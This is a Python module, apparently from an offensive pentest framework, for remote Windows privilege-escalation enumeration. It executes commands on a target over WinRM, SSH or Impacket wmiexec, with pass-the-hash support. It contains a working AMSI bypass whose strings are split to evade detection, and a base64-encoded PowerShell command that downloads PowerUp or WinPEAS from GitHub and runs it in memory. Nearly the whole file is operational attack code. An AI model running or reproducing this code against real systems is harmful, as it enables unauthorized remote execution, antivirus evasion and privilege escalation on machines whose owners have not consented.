import os
import subprocess
import base64
from core.logger import setup_logger

logger = setup_logger()

class LPEEnum:
    def __init__(self, target, domain, username, password, ntlm_hash=None):
        self.target = target
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        
    def execute_payload(self, command):
        """Tiered execution: Attempts WinRM (Evil-WinRM equivalent) -> SSH -> WMIEXEC."""
        # 1. Try WinRM (like Evil-WinRM)
        try:
            import winrm
            logger.info(f"[*] Attempting execution via WinRM (Evil-WinRM equivalent)...")
            
            # Setup session
            session = winrm.Session(self.target, auth=(f"{self.domain}\\{self.username}" if self.domain else self.username, self.password), transport='ntlm')
            if self.ntlm_hash and not self.password:
                logger.warning("[-] Native WinRM library does not directly support Pass-The-Hash currently. Skipping to WMI...")
                raise Exception("PTH not supported in native winrm")
                
            res = session.run_cmd('cmd.exe', ['/c', command])
            
            if res.status_code == 0:
                logger.info(f"[+] WinRM Execution Successful!")
                return res.std_out.decode('utf-8', errors='ignore').strip()
            elif res.std_out or res.std_err:
                out = res.std_out.decode('utf-8', errors='ignore').strip()
                err = res.std_err.decode('utf-8', errors='ignore').strip()
                result = out if out else err
                if result: return result
                
        except Exception as e:
            logger.warning(f"[-] WinRM failed: {e}. Trying next protocol...")

        # 2. Try SSH
        try:
            import paramiko
            logger.info(f"[*] Attempting execution via SSH...")
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            client.connect(self.target, username=f"{self.domain}\\{self.username}" if self.domain else self.username, password=self.password, timeout=5)
            
            stdin, stdout, stderr = client.exec_command(command)
            out = stdout.read().decode('utf-8', errors='ignore').strip()
            client.close()
            if out:
                logger.info(f"[+] SSH Execution Successful!")
                return out
        except Exception as e:
            logger.warning(f"[-] SSH failed: {e}. Falling back to WMIEXEC...")

        # 3. Fallback to WMIEXEC
        return self._execute_wmi(command)

    def _execute_wmi(self, command):
        """Uses Impacket's wmiexec.py natively as a last-resort fallback."""
        auth = f"{self.domain}/{self.username}" if self.domain else f"{self.username}"
        if self.password:
            auth += f":{self.password}"
            
        cmd = ["wmiexec.py"]
        if self.ntlm_hash:
            cmd.extend(["-hashes", self.ntlm_hash])
            
        cmd.append(f"{auth}@{self.target}")
        cmd.append(command)
        
        try:
            logger.info(f"[*] Executing payload via WMIEXEC fallback...")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            output, _ = process.communicate()
            
            filtered_out = []
            for line in output.split('\n'):
                if "Impacket" not in line and "SMBv" not in line and "password:" not in line and line.strip() != "":
                    filtered_out.append(line)
                    
            res = "\n".join(filtered_out).strip()
            if "WBEM_E_ACCESS_DENIED" in res:
                logger.error("[-] WMI Session Error: Access Denied. The user must be a Local Administrator for WMI.")
                return None
            return res
        except Exception as e:
            logger.error(f"[-] WMI Exec Error: {e}")
            return None

    def run_amsi_bypass_and_exec(self, remote_ps1_url, function_to_call):
        """Executes an AMSI bypass and loads a remote PowerShell script (PowerUp/WinPEAS) in memory."""
        
        # 1. AMSI Bypass (Reflection Method)
        amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siInitFailed','NonPublic,Static').SetValue($null,$true);"
        
        # 2. Setup TLS 1.2 for modern web downloads, then grab and invoke the script
        load_script = f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('{remote_ps1_url}');"
        
        # 3. Combine it all
        full_ps1 = f"{amsi_bypass} {load_script} {function_to_call}"
        
        # 4. We Base64 Encode the PowerShell payload to avoid WMI/CMD quoting hell
        encoded = base64.b64encode(full_ps1.encode('utf-16le')).decode('utf-8')
        wmi_cmd = f"powershell.exe -exec bypass -enc {encoded}"
        
        logger.info(f"[+] Memory-Injection Payload generated. Triggering execution constraints bypass...")
        res = self.execute_payload(wmi_cmd)
        
        if res:
             print("\n\033[36m==== Remote Execution Output ====\033[0m")
             print(res)
             print("\033[36m=================================\033[0m\n")
        else:
             logger.warning("[-] No output received. The script may have failed or was blocked by AV.")

    def run_basic_enum(self):
        """Living-Off-The-Land Basic LPE Checks"""
        logger.info("[*] Running native CMD local privilege checks...")
        
        print("\n\033[1m\033[33m==== Local User Privileges ====\033[0m")
        privs = self.execute_payload("whoami /priv")
        if privs: print(privs)
        
        print("\n\033[1m\033[33m==== Unquoted Service Paths ====\033[0m")
        unq = self.execute_payload('wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """')
        if unq: print(unq)


def run_lpe_module(target, domain, username, password, ntlm_hash, mode, script_url=None):
    if not target:
        logger.error("Target IP required. Use 'set DC_IP <ip>'")
        return False
        
    scanner = LPEEnum(target, domain, username, password, ntlm_hash)
    
    if mode == "basic":
         scanner.run_basic_enum()
         
    elif mode == "powerup":
         if not script_url:
              script_url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1"
         logger.info(f"[*] Fetching PowerUp from {script_url}...")
         scanner.run_amsi_bypass_and_exec(script_url, "Invoke-AllChecks")
         
    elif mode == "winpeas":
         if not script_url:
              script_url = "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1"
         logger.info(f"[*] Fetching WinPEAS from {script_url}...")
         logger.warning("[!] WinPEAS takes several minutes to run via WMI and output will stream at the end. Please wait...")
         # WinPeas output can be massive, using reduced checks
         scanner.run_amsi_bypass_and_exec(script_url, "Invoke-WinPEAS -SystemInfo -UserInfos -ProcessInfo")
         
    else:
         logger.error("Invalid LPE mode. Use 'basic', 'powerup', or 'winpeas'.")
